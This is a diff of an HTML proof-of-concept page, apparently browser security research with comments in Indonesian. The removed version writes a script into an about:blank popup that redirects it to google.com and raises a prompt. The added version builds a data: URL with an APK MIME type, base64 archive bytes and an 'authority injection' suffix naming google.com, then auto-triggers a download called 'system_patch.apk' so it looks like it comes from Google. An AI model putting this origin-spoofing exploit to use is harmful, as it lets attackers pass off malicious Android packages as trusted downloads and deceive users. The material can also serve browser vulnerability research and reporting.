@@ -1,60 +1,50 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Popup Download Gesture Test</title>
-<style>
-body { font-family:sans-serif;padding:20px }
-button { padding:12px 18px;font-size:16px }
-pre { background:#111;color:#0f0;padding:10px }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firefox Origin Spoofing + APK Fix</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 50px; }
+        .card { background: #2d2d2d; border-radius: 12px; padding: 30px; border: 1px solid #444; display: inline-block; }
+        button { 
+            background: #ff5252; color: white; padding: 15px 30px; border: none; 
+            border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px;
+        }
+        #log { margin-top: 20px; color: #00e676; font-family: monospace; }
+    </style>
 </head>
 <body>
 
-<h3>Popup Download Gesture Enforcement Test</h3>
-<button id="btn">Open Popup</button>
-<pre id="log"></pre>
+    <div class="card">
+        <h2>Firefox Security Research</h2>
+        <p>Testing Authority Injection with APK Payload</p>
+        <button onclick="runSpoof()">Trigger Spoofed Download</button>
+        <div id="log">Status: Ready</div>
+    </div>
 
-<script>
-const logEl = document.getElementById("log");
-const log = m => logEl.textContent += m + "\n";
-
-document.getElementById("btn").onclick = () => {
-  log("[1] User click received");
-
-  // 1️⃣ Open popup to about:blank first
-  const w = window.open(
-    "about:blank",
-    "_blank",
-    `
-      width=${screen.availWidth},
-      height=${screen.availHeight},
-      left=0,
-      top=0,
-      resizable=yes,
-      scrollbars=yes
-    `
-  );
-
-  if (!w) {
-    log("[ERROR] Popup blocked");
-    return;
-  }
-
-  log("[2] Popup opened at about:blank");
-
-  // 2️⃣ Inject test payload WHILE origin is about:blank
-  w.document.write(`
     <script>
-      setTimeout(function(){
-        w.location.href = "https://www.google.com";
-        const x = prompt("Masukkan sesuatu:");
-        console.log("Hasil prompt:", x);
-      }, 50); // 1000ms = 1 detik
-    <\/script>
-  `);
-};
-</script>
+        function runSpoof() {
+            const log = document.getElementById('log');
+            log.innerText = "Status: Triggering...";
 
+            // Payload APK minimalis (Magic Bytes PK..) agar Firefox tidak mengubah ke .txt
+            const apkBase64 = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";
+
+            // Menggunakan teknik Authority Injection yang kamu temukan
+            // Struktur: data:[MIME];base64,[DATA]/\\//google.com/
+            const spoofedURL = "data:application/vnd.android.package-archive;base64," + apkBase64 + "/\\\\\\/.google.com/application/x-msdownload";
+
+            const a = document.createElement("a");
+            a.href = spoofedURL;
+            a.download = "system_patch.apk";
+            
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            log.innerText = "Status: Download triggered! Check extension and origin.";
+        }
+    </script>
 </body>
 </html>
